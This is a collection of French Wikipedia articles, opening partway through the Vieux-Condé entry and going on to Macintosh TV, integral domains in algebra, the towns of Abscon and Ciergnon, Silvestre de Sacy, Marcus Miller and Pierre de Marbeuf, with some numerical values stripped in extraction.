Elle appartient à l'unité urbaine de Valenciennes (partie française), une agglomération internationale regroupant , dont elle est une commune de banlieue. Par ailleurs la commune fait partie de l'aire d'attraction de Valenciennes (partie française), dont elle est une commune de la couronne. Cette aire, qui regroupe , est catégorisée dans les aires de moins de .
Projet d'aménagement.
Depuis 2015, la ville compte deux quartiers prioritaires : les cités de la Solitude et de l'Hermitage, réunies au sein d'un seul quartier prioritaire qui compte pour un taux de pauvreté de 43 %, ainsi que le quartier du Jard, avec pour 37 % de pauvreté, et qui fait partie du programme national de revitalisation des quartiers anciens dégradés (PNRQAD).
Occupation des sols.
L'occupation des sols de la commune, telle qu'elle ressort de la base de données européenne d'occupation biophysique des sols Corine Land Cover (CLC), est marquée par l'importance des territoires agricoles (46,6 % en 2018), une proportion sensiblement équivalente à celle de 1990 (47 %). La répartition détaillée en 2018 est la suivante :
zones urbanisées (39,3 %), prairies (25 %), terres arables (15,5 %), zones agricoles hétérogènes (6,1 %), forêts (4,4 %), zones humides intérieures (3,1 %), zones industrielles ou commerciales et réseaux de communication (2,8 %), eaux continentales (2,2 %), milieux à végétation arbustive et/ou herbacée (1,7 %). L'évolution de l'occupation des sols de la commune et de ses infrastructures peut être observée sur les différentes représentations cartographiques du territoire : la carte de Cassini (), la carte d'état-major (1820-1866) et les cartes ou photos aériennes de l'IGN pour la période actuelle (1950 à aujourd'hui).
Toponymie.
Mannier relève une contradiction : la ville de Condé-sur-Escaut est attestée antérieurement à Vieux-Condé, qui n'est donc pas plus vieux que Condé. Il pourrait s'agir d'une déformation de "vadum condati", le « gué de Condé », "vadum" ayant donné dans les anciennes langues d'oïl "vey", "wei" ou "wé".
Sous la Révolution et jusqu'en 1810, Vieux-Condé est rebaptisé « Vieux-Nord-Libre ».
Ses habitants sont appelés les "Vieux-Condéens".
Histoire.
On trouve une première mention de Vieux-Condé en 1215 lorsque celui-ci, encore un village, s'appelle « Vetus Condatum », "Condatum" ayant la même origine que le nom de la ville limitrophe de Condé.
Bien souvent ravagé par la guerre, le village est particulièrement touché en 1645, quand à peine 6 ou 7 maisons demeurent debout.
En 1741, de la houille est découverte à Vieux-Condé.
En 1773, découverte de nombreuses médailles des premiers empereurs romains.
Le , sont érigées en duché les terres de Condé, Fresnes, Vieux-Condé, Hargnies, situées en Hainaut, sous la dénomination de duché de Croÿ en faveur d'Emmanuel Ferdinand François duc de Croÿ (maison de Croÿ).
La commune se développe surtout au cours du avec l'industrie houillère. Elle a été desservie à partir de 1873 par la ligne de Somain à Péruwelz exploitée par la Compagnie des mines d'Anzin, puis, après sa nationalisation, par les Houillères du bassin du Nord et du Pas-de-Calais. Le service voyageur a cessé en 1963 et la ligne a été démantelée en 1975.
La ville disposait également d'une desserte par l'une des lignes de l'ancien tramway de Valenciennes de 1883 à 1966.
Politique et administration.
Instances judiciaires et administratives.
La commune se trouve depuis 1824 dans l'arrondissement de Valenciennes du département du Nord.
Elle était depuis 1793 le chef-lieu du canton de Condé-sur-l'Escaut. Dans le cadre du redécoupage cantonal de 2014 en France, cette circonscription administrative territoriale a disparu, et le canton n'est plus qu'une circonscription électorale.
La commune relève, dans l'ordre judiciaire, du tribunal judiciaire de Valenciennes, de la cour d'appel de Douai, du tribunal pour enfants de Valenciennes, du conseil de prud'hommes de Valenciennes, du tribunal de commerce de Valenciennes, et, dans l'ordre administratif, du tribunal administratif de Lille et de la cour administrative d'appel de Douai.
Pour les élections départementales, la commune fait partie depuis 2014 du canton de Marly
Pour l'élection des députés, elle fait partie de la vingtième circonscription du Nord.
Intercommunalité.
La ville fait partie de la communauté d'agglomération Valenciennes Métropole, créée en 2000 par la fusion de la "communauté de communes de la vallée de l'Escaut", de la "communauté de communes du Pays de Condé" et du "syndicat intercommunal à vocation multiple (SIVOM) de Trith-Saint-Léger et environs".
Tendances politiques et résultats.
Lors du second tour des élections municipales de 2014 dans le Nord, la liste DVG menée par Guy Bustin obtient la majorité absolue des suffrages exprimés, avec (52,18 %, 25 conseillers municipaux élus dont 3 communautaires), battant celle du maire sortant Serge Van Der Hoeven, qui a obtenu (47,81 %, 8 conseillers municipaux élus dont 1 communautaire), lors d'un scrutin marqué par 37,12 % d'abstention.
Lors du deuxième tour des élections municipales de 2020 dans le Nord, la liste DVG menée par David Bustin obtient la majorité absolue des suffrages, avec (51,49 %, 25 conseillers municipaux élus, dont 3 communautaires), devançant de 105 voix celle d'union de la gauche menée par Franck Agah (, 48,540 %, 8 conseillers municipaux élus dont 1 communautaire), lors d'un scrutin marqué par la Pandémie de Covid-19 en France où 53,66 % des électeurs se sont abstenus.
Population et société.
Démographie.
Pyramide des âges.
La population de la commune est relativement jeune.
En 2018, le taux de personnes d'un âge inférieur à s'élève à 36,5 %, soit en dessous de la moyenne départementale (39,5 %). À l'inverse, le taux de personnes d'âge supérieur à est de 24,9 % la même année, alors qu'il est de 22,5 % au niveau départemental.
En 2018, la commune comptait pour , soit un taux de 51 % de femmes, légèrement inférieur au taux départemental (51,77 %).
Les pyramides des âges de la commune et du département s'établissent comme suit.
Culture.
Le Boulon, centre national des arts de la rue et de l'espace public, accueille de nombreuses compagnies nationales et internationales en résidence, programme des spectacles d'arts de la rue et de cirque et organise le festival "Les Turbulentes" ( en 2014).
Économie.
Industrie.
La localité a, depuis longtemps, été un lieu de développement de la métallurgie principalement axée vers le forgeage.
En 1828, Philippe Dervaux créa les « établissements Dervaux » spécialisés dans le forgeage à froid. L'établissement produisit les de la Tour Eiffel, ainsi que les tire-fond de fixation des rails pour le transsibérien financé par le fameux emprunt russe. La société est rachetée par Simca en 1954 qui devient Chrysler en 1970 et dont les filiales européennes sont rachetées par le Groupe PSA (Peugeot) en 1978 ; elle assure alors la fabrication de la visserie et de pièces automobiles diverses (axes, barres de torsion, etc.) ainsi que d'une grande variété de pièces non automobiles. Elle est ensuite cédée à la Financière du Valois, appartenant à Michel Coencas, qui la baptisa « Valmex » (1990), puis au groupe américain Textron (1996), et plus récemment au groupe américain (2006). En , Agrati , groupe industriel italien spécialisé dans la fixation automobile a fait l'acquisition de l'usine implantée sur le site de Vieux-Condé.

</doc>
<doc id="192011" url="https://fr.wikipedia.org/wiki?curid=192011" title="Macintosh TV">
Macintosh TV

Le Macintosh TV fut le premier Macintosh à TV intégré. Il était dans un boîtier identique au LC 550, mais tout noir (ce fut avec le Power Mac 5400 le seul Macintosh noir). Il permettait de regarder la télévision en 16 bits dans tout pays utilisant le standard vidéo NTSC. On ne pouvait pas l'utiliser en tant qu'ordinateur et en même temps regarder la télévision.
Le "Macintosh TV" fut le dernier Macintosh à utiliser un processeur Motorola 68030. Il était même particulièrement peu puissant, principalement à cause de son bus système cadencé à seulement (alors que le processeur tournait à ). De plus, il était très peu évolutif (à moins de sacrifier les capacités TV) : il n'avait aucun slot d'extension et son unique emplacement mémoire n'acceptait que des barrettes de 8 Mio maximum.
Seules unités furent produites, entre octobre 1993 et avril 1994, ce qui en fait peut-être le Macintosh le plus rare.
Ce fut le premier ordinateur Mac à être vendu avec une télécommande.

</doc>
<doc id="192012" url="https://fr.wikipedia.org/wiki?curid=192012" title="Anneau intègre">
Anneau intègre

Un anneau intègre ou anneau d'intégrité est un anneau commutatif unitaire différent de l'anneau nul et qui ne possède aucun diviseur de zéro.
Définition.
Un anneau commutatif unitaire formula_1 est dit intègre s'il est
En pratique, travailler dans un anneau intègre permet de résoudre des équations produit nul.
Note terminologique.
Un nombre limité de sources fournissent des définitions différentes des termes « Anneau intègre » ou « Anneau d'intégrité », soit qu'elles n'exigent pas la commutativité, soit qu'elles n'exigent pas la présence d'un neutre pour la multiplication, soit très exceptionnellement qu'elles n'exigent pas que l'anneau ait au moins deux éléments.
Le présent article, qui se borne au cas commutatif et unitaire n'aborde pas ces variantes ; on renvoie à l'article intitulé « Anneau sans diviseur de zéro » pour celle où la commutativité n'est pas requise.
Exemples.
En revanche :
Anneaux intègres finis.
La démonstration repose sur une observation : la multiplication par un élément fixé non nul formula_5, qui est toujours injective dans un anneau intègre formula_8, est nécessairement aussi surjective quand l'anneau est fini, ce qui montre l'existence d'un inverse de formula_5.
Corps des fractions d'un anneau intègre.
Soit "A" un anneau intègre. Un procédé de passage au quotient sous une relation d'équivalence permet de construire un corps commutatif "K"("A") et une injection de "A" dans "K"("A"). Cette construction fournit le plus petit corps dans lequel "A" se plonge, au sens de la propriété universelle suivante :
Pour tout corps "L" et tout morphisme injectif d'anneaux formula_19de "A" dans "L", il existe un unique morphisme de corps formula_20 de "K"("A") dans "L" tel que formula_21
Cette construction n'est que la réécriture en termes un peu plus abstraits de la construction du corps Q des nombres rationnels à partir de l'anneau Z des entiers relatifs. Appliquée à un anneau de polynômes formels, elle produit un corps de fractions rationnelles.
Divisibilité.
Les anneaux intègres forment un bon cadre pour généraliser des questions de divisibilté des entiers. On dit, pour deux éléments "a", "b" d'un anneau commutatif "A", que "a" divise "b" (dans "A") s'il existe "q" dans "A" tel que (on a des formulations équivalentes « "a" est diviseur de "b" », « "b" est divisible par "a" », et « "b" est multiple de "a" »). Ce qui est particulier pour les anneaux intègres est que dans ce cas, si un élément non nul "a" divise "b", alors l'élément "q" (le quotient) est toujours "unique", et peut donc être noté : si l'on suppose , alors , et donc car . En d'autres termes, tout élément non nul de "A" est régulier.
La structure donnée par la divisibilité dans un anneau intègre peut être beaucoup plus compliquée que dans formula_3, ce qui mène à distinguer un certain nombre de propriétés et relations.
Anneaux principaux, factoriels et euclidiens.
Les trois définitions qui suivent isolent des propriétés arithmétiques remarquables de l'anneau Z des entiers relatifs, et sont utilisées pour délimiter trois classes d'anneaux commutatifs dans lesquels l'arithmétique ressemble de plus ou moins près à celle des entiers.
Anneaux factoriels.
Ce sont les anneaux dans lesquels on dispose d'une décomposition qui imite la décomposition en produit de facteurs premiers des entiers naturels non nuls.
On appelle anneau factoriel un anneau intègre dans lequel tous les éléments non nuls se décomposent de manière "unique" (à l'ordre et aux facteurs inversibles près) en produit d'éléments irréductibles.
Si "A" est un anneau factoriel, l'anneau de polynômes "A"["X"] l'est également. Par application répétée de cette construction à un corps commutatif "k", évidemment factoriel, les anneaux de polynômes à plusieurs indéterminées "k"["X"1...,"X""n"] sont en particulier factoriels.
Tant en théorie algébrique des nombres qu'en géométrie algébrique, des anneaux non factoriels se manifestent même à un niveau élémentaire : ainsi l'anneau d'entiers quadratiques Z[i] n'est pas factoriel ; il en est de même de l'anneau quotient de "k"["X","Y"] par l'idéal engendré par "X"2 – "Y"3.
Anneaux principaux.
Dans cette section, on note ("x"1, "x"2..., "x""n") l'idéal engendré par "x"1, "x"2..., "x""n".
Un idéal "I" d'un anneau commutatif "A" est dit principal lorsqu'il existe un "a" élément de "A" tel que "I" = ("a"). On appelle anneau principal un anneau intègre dans lequel tout idéal est principal.
Tout anneau principal est factoriel. La réciproque n'est pas vraie : ainsi l'anneau factoriel de polynômes "k"["X","Y"] n'est pas principal — il est en effet impossible de trouver un polynôme à deux variables "P" tel que ("X", "Y") = ("P").
Dans un anneau principal, comme dans tout anneau factoriel, deux éléments "a" et "b" admettent toujours un PGCD noté ici "d", mais on a davantage : la principalité garantit l'existence de "x" et "y" tels que "d = ax" + "by. Ainsi, dans" cette classe d'anneaux plus restreinte, on dispose non seulement de la décomposition en facteurs premiers mais aussi du théorème de Bézout.
Anneaux euclidiens.
Dans cette classe d'anneaux, on a une structure similaire à celle donnée par la division euclidienne dans Z : pour toute division par un élément non nul, il existe un quotient et un reste, où le reste est toujours plus petit dans un sens précis que le diviseur. Si ce quotient et ce reste peuvent être déterminés par un algorithme de division (comme c'est le cas souvent), on pourra effectuer l'algorithme d'Euclide dans "A" en utilisant cette division. Tout anneau euclidien est principal, et c'est la façon la plus simple de prouver que certains anneaux sont principaux ; c'est notamment le cas de Z, et de tout anneau de polynômes à une indéterminée à coefficients dans un corps. Néanmoins, il existe des anneaux principaux qui ne sont pas euclidiens.
Éléments entiers sur un anneau intègre.
Dans un anneau intègre "A" contenant un sous-anneau "B", un élément "x "∈ "A" est dit entier sur "B "s'il est racine d'un polynôme unitaire à coefficient dans "B".
Dans un anneau intègre "A" contenant un sous-anneau "B", la fermeture intégrale de "B" dans "A" est l'ensemble des éléments de "A" entiers sur "B". C'est un sous-anneau de "A" contenant "B" comme sous-anneau.
Un anneau intégralement clos est un anneau intègre égal à sa fermeture intégrale dans son corps des fractions.
Anneaux de Dedekind.
Un anneau de Dedekind est, par définition, un anneau noethérien intégralement clos dans lequel tout idéal premier non nul est maximal.

</doc>
<doc id="192014" url="https://fr.wikipedia.org/wiki?curid=192014" title="Abscon">
Abscon

Abscon est une commune française située dans le département du Nord en région Hauts-de-France, dans l'arrondissement de Valenciennes, à l'ouest de Denain.
Géographie.
Localisation.
Située à 20 minutes de Douai, ou encore à 10 minutes de Valenciennes, Abscon possède une situation géographique privilégiée. Au contact d'une autoroute, cette ville est la dernière limite du Hainaut et touche le Douaisis. À d'altitude et peuplée d’environ habitants, la ville d'Abscon s'étend sur .
Cette ville, dite « en croix », est décrite suivant deux routes concourantes aux « 4 chemins » délimitant le centre-ville. Les corons, installés avec les anciennes activités minières, et les commerces s'étendent de part et d'autre de ces deux grandes rues dont une route nationale.
Hydrographie.
La commune est située dans le bassin Artois-Picardie. Elle n'est drainée par aucun cours d'eau.
Climat.
Plusieurs études ont été menées afin de caractériser les types climatiques auxquels est exposé le territoire national. Les zonages obtenus diffèrent selon les méthodes utilisées, la nature et le nombre des paramètres pris en compte, le maillage territorial des données et la période de référence. En 2010, le climat de la commune était ainsi de type climat océanique dégradé des plaines du Centre et du Nord, selon une étude du Centre national de la recherche scientifique (CNRS) s'appuyant sur une méthode combinant données climatiques et facteurs de milieu (topographie, occupation des sols) et des données couvrant la période 1971-2000. En 2020, le climat prédominant est classé Cfb, selon la classification de Köppen-Geiger, pour la période 1988-2017, à savoir un climat tempéré à été frais sans saison sèche. Par ailleurs Météo-France publie en 2020 une nouvelle typologie des climats de la France métropolitaine dans laquelle la commune est exposée à un climat océanique et est dans la région climatique Nord-est du bassin Parisien, caractérisée par un ensoleillement médiocre, une pluviométrie moyenne régulièrement répartie au cours de l’année et un hiver froid (). Elle est en outre dans la zone H1a au titre de la réglementation environnementale 2020 des constructions neuves.
Pour la période 1971-2000, la température annuelle moyenne est de , avec une amplitude thermique annuelle de . Le cumul annuel moyen de précipitations est de , avec de précipitations en janvier et en juillet. Pour la période 1991-2020, la température moyenne annuelle observée sur la station météorologique de Météo-France la plus proche, sur la commune de Valenciennes à à vol d'oiseau, est de et le cumul annuel moyen de précipitations est de . .
Urbanisme.
Typologie.
Au , Abscon est catégorisée ceinture urbaine, selon la nouvelle grille communale de densité à sept niveaux définie par l'Insee en 2022.
Elle appartient à l'unité urbaine de Valenciennes (partie française), une agglomération internationale regroupant , dont elle est une commune de la banlieue. Par ailleurs la commune fait partie de l'aire d'attraction de Somain, dont elle est une commune du pôle principal. Cette aire, qui regroupe , est catégorisée dans les aires de moins de .
Occupation des sols.
L'occupation des sols de la commune, telle qu'elle ressort de la base de données européenne d'occupation biophysique des sols Corine Land Cover (CLC), est marquée par l'importance des territoires agricoles (73,3 % en 2018), une proportion sensiblement équivalente à celle de 1990 (73,7 %). La répartition détaillée en 2018 est la suivante : 
terres arables (73,3 %), zones urbanisées (20,1 %), forêts (4,6 %), milieux à végétation arbustive et/ou herbacée (1,7 %), mines, décharges et chantiers (0,4 %). L'évolution de l'occupation des sols de la commune et de ses infrastructures peut être observée sur les différentes représentations cartographiques du territoire : la carte de Cassini (), la carte d'état-major (1820-1866) et les cartes ou photos aériennes de l'IGN pour la période actuelle (1950 à aujourd'hui).
Voies de communication et transports.
La commune était desservie par les transports en commun ferroviaire à la gare d'Abscon.
La commune est desservie par la ligne 111 du réseau Transvilles et par la ligne 811 du réseau interurbain Arc en Ciel 3.
Toponymie.
"Absconium", cartulaire de Marchiennes, 1123 "Absconsum", Le Glay.Camerac.Christ. . "Absconditum". "Asconuim", Mirœus, Op. dipl. 1. 113. "Ascons", Jean Froissart, Liv.1 ch. 113.
Histoire.
Il y a 40 millions d'années, une mer intérieure recouvrait Abscon et ses environs ce qui rend son sous-sol calcaire.
Antiquité.
À l'époque romaine, le lieu est entouré d'une immense forêt. Quand les Romains envahissent la région, ils s'installent dans les anciennes demeures abandonnées par les Gaulois. Ils remarquent qu'ils sont bien protégés par les bois environnants et appellent le lieu "Abscondinium", "Absconditum" signifiant « caché ». Des fouilles archéologiques ont d'ailleurs permis de découvrir un temple druidique et des sépultures gauloises. Au fil des âges, le mot se métamorphose et devient "Abconium" en 1103, "Abscons" en 1349, "Abescon" en 1700 et enfin Abscon.
Le village est évangélisé au par saint Piat, époque à laquelle Rome envoie des apôtres dans les Gaules : ceux-ci fondent de nombreux monastères où les religieux travaillent à l'évangélisation.
Moyen Âge.
Vers 630, Adalbaud, comte de Douai, fonde l'abbaye de Marchiennes. Quand il meurt assassiné, sa femme qui ne se remarie pas, se réfugie au monastère de Marchiennes. Devenue sainte Rictrude, elle lègue tous ses biens (dont Abscon et les terres qui l'entourent) à ladite abbaye. Abscon en porte d'ailleurs les armoiries. Une statue de sainte Rictrude se trouve à l'église de Marchiennes.
Le village était soumis à l'abbaye de Marchiennes qui prétendait le posséder en vertu du testament de sainte Rictude.
Au , Abscon est érigé en paroisse. L'église est dédiée à saint Brice qui en est toujours le patron. Un siècle plus tard, le village compte environ 80 habitants. Froissart raconte qu'en 1340, pendant la guerre de Cent Ans, les Douaisiens, alliés des Français incendient une moitié d'Abscon dont les habitants leur étaient hostiles mais après leur départ la garnison de Bouchain vint en représailles incendier l'autre partie.
De Charles Quint à la Révolution française.
Située dans une zone frontière, Abscon est plusieurs fois incendié en raison de guerres fréquentes. Pendant 80 ans, le village est occupé par les troupes de Charles Quint.
Au , Abscon prend de l'importance comme groupement rural : en 1553, on recense 180 habitants (pour 36 foyers) principalement groupés autour de l'église et le long de la voie axiale menant à Mastaing et Marquette. À l'aube de la Révolution, la population a pratiquement doublé.
Le , la paroisse d'Abscon qui devient une commune, passe de la prévôté de Bouchain au district de Valenciennes.
Le de hussards appartenait à l'armée du Nord, commandée par le général Pichegru. Le Hussards bouscule un régiment de dragons hessois, dans les opérations du 18 et à Abscon, capturent le colonel, de nombreux officiers et 120 dragons montés.
: l'essor industriel.
Avec l'ouverture de la fosse La Pensée, l'année 1822 inaugure une nouvelle ère grâce à la Compagnie des mines d'Anzin.
En 1830, la mise en service de la fosse Saint-Mark puis en 1856 celle de Casimir-Perier provoquent un important accroissement de la population et modifient la physionomie du village, notamment par la construction des premiers corons. La présence conjuguée de la houille, de la chaux et de la "Grande route" amènent en 1833, l'implantation d'une sucrerie. Reprise par M. Delloye en 1913, celle-ci ferme ses portes en 1963. En 1841, la commune est reliée au chemin de fer du Nord de Somain. En 1854, une verrerie s'implante également à proximité de la "fosse Saint-Marck" et fonctionne jusqu'à l'aube de la Première Guerre mondiale. En parallèle, des carrières souterraines y ont été creusées pour exploiter la craie.
Enfin, en 1886, on inaugure la mairie.
En , les Allemands installent un champ d'aviation à l'emplacement actuel de la "Cité du 11-Novembre" et de la "Résidence du Château d'eau". Le , Abscon est libéré par les troupes canadiennes. Les années 1920 voient la reconstruction et l'arrivée massive des émigrés polonais venus remplacer la main-d'œuvre minière disparue lors de la Grande Guerre. Le village poursuit son extension par la construction de la "Cité du Chaufour".
La "Fosse de la Pensée" est abandonnée en 1928 et sert de retour d'air à sa voisine la "Fosse Casimir-Périer", avant de disparaître et d'être remblayée en 1950.
À partir de 1956, le programme d'amélioration de l'habitat se traduit par la construction d'écoles, de nouveaux lotissements et d'un château d'eau. Fin 1968, la "fosse Saint-Marck" est à son tour fermée.
Après une période de déclin industriel qui dure près de 15 ans, Abscon s'agrandit et s'embellit. L'ancienne église bâtie en 1892 et fermée au culte en à cause d'affaissements miniers, est remplacée par un nouvel édifice inauguré en 1981. La rénovation se poursuit en par l'ouverture d'un nouveau centre administratif puis par l'agrandissement des groupes scolaires, la construction d'une salle de sports, d'une nouvelle gendarmerie, de la "Cité des Aulnes", la "Cité des Sycomores", la "Cité des Acacias"…
Politique et administration.
Tendances politiques et résultats.
Le résultat de l'élection présidentielle de 2012 dans cette commune est le suivant :
Le résultat de l'élection présidentielle de 2017 dans cette commune est le suivant :
Politique locale.
Une élection partielle s'est tenue en 1990.
Lors du premier tour des élections municipales le , 27 sièges sont à pourvoir ; on dénombre , dont (80,89 %), (1,14 %) et (58,21 %). La liste "Entente et action municipale", étiquetée divers gauche, menée par le maire sortant Patrick Kowalczyk recueille (51,20 %) et est ainsi élue dès le premier tour avec vingt-et-un sièges. La liste divers droite "Agir pour les Absconnais" menée par Éric Granato obtient six sièges avec (48,80 %).
Liste des maires.
Maire de 1802 à 1807 : Guillemot.
Maire en 1808 : Plichon.
Intercommunalité.
La commune fait partie de la communauté d'agglomération de la Porte du Hainaut.
Instances judiciaires et administratives.
La commune relève du tribunal d'instance de Valenciennes, du tribunal de grande instance de Valenciennes, de la cour d'appel de Douai, du tribunal pour enfants de Valenciennes, du conseil de prud'hommes de Valenciennes, du tribunal de commerce de Valenciennes, du tribunal administratif de Lille et de la cour administrative d'appel de Douai.
Population et société.
Démographie.
Pyramide des âges.
La population de la commune est relativement jeune.
En 2018, le taux de personnes d'un âge inférieur à s'élève à 36,1 %, soit en dessous de la moyenne départementale (39,5 %). À l'inverse, le taux de personnes d'âge supérieur à est de 26,6 % la même année, alors qu'il est de 22,5 % au niveau départemental.
En 2018, la commune comptait pour , soit un taux de 52,17 % de femmes, légèrement supérieur au taux départemental (51,77 %).
Les pyramides des âges de la commune et du département s'établissent comme suit.
Enseignement.
Abscon fait partie de l'académie de Lille.
Culture locale et patrimoine.
Folklore.
Les géants Adalbaud et Rictrude.

</doc>

<doc id="248561" url="https://fr.wikipedia.org/wiki?curid=248561" title="Ustazade Silvestre de Sacy">
Ustazade Silvestre de Sacy

Samuel Ustazade Silvestre de Sacy, né le à Paris où il est mort le , est un journaliste et homme politique français, conservateur de la Bibliothèque Mazarine et membre de l'Académie française. Son nom « Ustazade » signifie « fils du maître » en persan, probablement en raison du statut de son père en tant qu'orientaliste célèbre.
Aperçu biographique.
Fils d'Antoine-Isaac Silvestre de Sacy (1758-1838), il fut pendant vingt ans rédacteur au "Journal des débats" où il s'occupait de critique littéraire.
Il fut conservateur de la Bibliothèque Mazarine en 1836 et en devint l'administrateur en 1848.
Il fut élu membre de l'Académie française le , en remplacement d’Antoine Jay, au fauteuil numéro 15.
En 1865, il fut nommé sénateur du Second Empire.
Le , sa petite-fille Rachel Silvestre de Sacy épouse à Paris Charles de La Poix de Fréminville, pionnier du Taylorisme en France.
Il est inhumé au cimetière du Père-Lachaise ().
Avant sa mort, son poste de bibliothécaire fut proposé par Hippolyte Taine à Gustave Flaubert, mais malgré l'intervention d'amis de l'écrivain, dont Ivan Tourgueniev, dans les milieux proches du pouvoir, dont Juliette Adam, Léon Gambetta y nomma le philologue Frédéric Baudry.

</doc>
<doc id="248563" url="https://fr.wikipedia.org/wiki?curid=248563" title="Medecin">
Medecin



</doc>
<doc id="248564" url="https://fr.wikipedia.org/wiki?curid=248564" title="New delhi">
New delhi



</doc>
<doc id="248565" url="https://fr.wikipedia.org/wiki?curid=248565" title="Marcus Miller">
Marcus Miller

William Henry Marcus Miller, Jr., né à Brooklyn (États-Unis, New York) le , est un compositeur et bassiste de jazz fusion.
Il se définit lui-même comme un bassiste ("North Sea Jazz Cruise", Patrick Savey). Multi-instrumentiste, il joue d'abord de la clarinette avant de se consacrer particulièrement à la basse, et jouer aussi de la clarinette basse. Sa carrière décolle lors de ses fructueuses collaborations avec Miles Davis (en naîtra dans les années 1980 l'enregistrement "Tutu"). Il a également travaillé sur l'album "Zoolook" de Jean Michel Jarre en 1984.
Techniquement, il se distingue par sa grande maîtrise des techniques complexes comme le slap.
Biographie.
Le père de Marcus Miller jouait du piano et de l'orgue à l'église, et il a appris à son fils à jouer de ces instruments. À environ dix ans, le jeune Marcus apprend à jouer de la clarinette. Son apprentissage de la guitare basse commence peu après, alors qu'il a douze ans. Il en apprend les rudiments seul en appliquant à cet instrument les connaissances théoriques acquises lors de son approche de la clarinette. Il a déjà à cette époque l'ambition de devenir un musicien professionnel. Vers l'âge de 22 ans, il commence à créer un style qui lui est propre. Sa carrière commence peu après grâce à Miles Davis.
En 1987, il participe à l'album "Nougayork" de Claude Nougaro, en tant que sideman. En 1994 il produit l'album "Tenderness" d'Al Jarreau enregistré "live" en studio et pour lequel collaborent Paulinho Da Costa, Steve Gadd, Joe Sample, Eric Gale ou encore David Sanborn.
En 1996, il apparaît comme producteur d'une des chansons du dernier album studio enregistré par France Gall, "France" : "La Minute de silence", qu'il teinte de blues. Il travaille également avec Aretha Franklin sur l'album "Jump To It" et avec Luther Vandross sur plusieurs de ses albums.
En 2008 il enregistre un album avec Stanley Clarke et Victor Wooten (deux autres grands bassistes) nommé SMV Thunder.
Hommage à son père.
Marcus Miller rend hommage à son père (William H) lors de la tournée portant sur son album Laid Black à sortir en . Il est issu d'une famille imprégnée dans la musique. Son père avait comme ambition de devenir un musicien de classique et son oncle fut un célèbre musicien de piano qui collabora avec Miles Davis. Cette ambition de devenir musicien professionnel de classique fut mise de côté à la suite de la rencontre avec la mère de Marcus Miller, avec qui il eut deux garçons. Il fit alors le choix de se consacrer à sa famille et de trouver un travail pérenne de conducteur de bus puis de métro afin de la soutenir et de veiller à l'éducation de ses enfants. Marcus Miller assure que sa carrière n'est que la continuation du rêve de son père qui été quelqu'un de très influent sur sa vie d'artiste et d'homme. Il était présent lors de son début de collaboration avec la légende Miles Davis lors d'un concert à Toronto. Marcus Miller dit l'avoir senti très fier à cette occasion, tant cela représentait une sorte d'accomplissement pour lui et son père, et probablement encore plus pour ce dernier.
Son père disparaît en , alors âgé de 92 ans. La chanson "Preacher's Kid (Song for William H)" figurant sur son album "Afrodeezia" est un hommage à ce dernier qui était maître de chœur et joueur d'orgue à l'église. Cet album obtient une nomination aux Grammy Awards en 2016.
Instruments.
Depuis ses débuts, Marcus Miller joue essentiellement sur une Fender Jazz Bass de 1977, de couleur naturelle et avec touche érable, et customisée par l'apport d'un préampli actif Bartolini 2 bandes et d'un chevalet BadAss II. Il utilise des cordes Dunlop.
Depuis 2015, le constructeur de guitares Sire commercialise des basses sous la marque Marcus Miller.
Discographie.
Contributions.
Au cinéma.
1982: Fame (série télévisée) musicien pour Différentes musiques de la série 

</doc>
<doc id="248566" url="https://fr.wikipedia.org/wiki?curid=248566" title="Ciergnon">
Ciergnon

Ciergnon (en wallon "Ciergnon") est une section et un village de la commune belge de Houyet situés en Région wallonne dans la province de Namur.
C'était une commune à part entière avant la fusion des communes de 1977.
Étymologie.
1139 Serenium 1351 Seregnon Villa de Serenius ou lieu clair ou mieux ruisseau clair - (archives Namur)
En contrebas de l'église actuelle et du monument aux morts de la guerre se trouve un petit pré qui garde les traces d'une ancienne
tour, fossé circulaire boueux. Le lieu-dit est "la tour", prononcé en langage courant: "la Tou".
Histoire.
Le village de Ciergnon est notoire pour son château qui offre une vue imprenable sur toute la région et qui est visible de très loin. Ce domaine est acheté en 1840 par le roi des Belges Léopold à la demande de son épouse la reine Louise-Marie. Il y fait construire un pavillon de chasse avec une terrasse-belvédère. Leur fils Léopold II demande à l'architecte Alphonse Balat de transformer le bâtiment en un château. En 1903, il le lègue à la Donation royale à condition de le laisser à disposition de la famille royale belge. Tous ses successeurs ont été conquis par la beauté de l'endroit et y ont passé de nombreux moments de quiétude.
Durant la Seconde Guerre mondiale, lors de la Bataille de France, Ciergnon est prise le , après que les Français s'en sont repliés, par les Allemands de la "Panzer-Aufklärung-Abteilung 37", unité de reconnaissance de la Panzerdivision d'Erwin Rommel. Pendant l'Occupation, les princes Baudouin et Albert y ont vécu plusieurs mois, loin des soldats nazis qui surveillaient leur père Léopold III.
En 1960, le roi Baudouin y présente sa fiancée Fabiola de Mora y Aragón aux Belges. Plus près de nous, le château de Ciergnon est le cadre d'autres événements heureux, comme les 60 ans du roi Albert II en 1994 ou les baptêmes des quatre enfants des princes héritiers (la princesse Élisabeth, les princes Gabriel et Emmanuel, et la princesse Éléonore) dans la chapelle du domaine restaurée par la reine Paola.

</doc>
<doc id="248567" url="https://fr.wikipedia.org/wiki?curid=248567" title="Long road out to hell">
Long road out to hell



</doc>
<doc id="248568" url="https://fr.wikipedia.org/wiki?curid=248568" title="Pierre de Marbeuf">
Pierre de Marbeuf

Pierre de Marbeuf (vers 1596 - vers 1645) est un poète baroque français du .
Biographie.
Fils de Catherine Hellouin et du sieur François de Marbeuf, parfois écrit Marboeuf, écuyer, sieur d'Ymares et de Sahurs en partie, il naît à Sahurs, dans la généralité de Rouen, province de Normandie.
Pierre de Marbeuf fait ses études au collège jésuite de La Flèche dans le Maine où il a pour camarade René Descartes. Il entreprend probablement des études de droit à Orléans, ponctuées d'un goût prononcé pour la séduction. C'est donc dans un tout autre domaine qu'il obtient un premier succès : en participant en 1618 au concours des Palinods de Rouen, comme son aîné rouennais, Jean Auvray. Cette consécration lui permet de publier un "Psaltérion chrétien, dédié à la Mère de Dieu, l'Immaculée Vierge Marie" à Rouen et "Poésies mêlées" parmi lesquelles se trouve une imitation du chapitre 1er des Lamentations de Jérémie.
En 1619, année de son arrivée à Paris, il publie le "Poème sur l'heureux mariage du sérénissime prince Victor-Amédée de Savoie avec Madame Christine, sœur du Roi".
À Paris, où il séjourne jusqu'en 1623, il fréquente le cercle des jeunes poètes groupés autour de Pierre de Marolles. Ce groupe, qu'on appelle l'académie Piat Maucors, du nom de celui qui les accueille, prône une poésie moderne (selon les préceptes de Malherbe), pure grammaticalement et marquée par une solide piété.
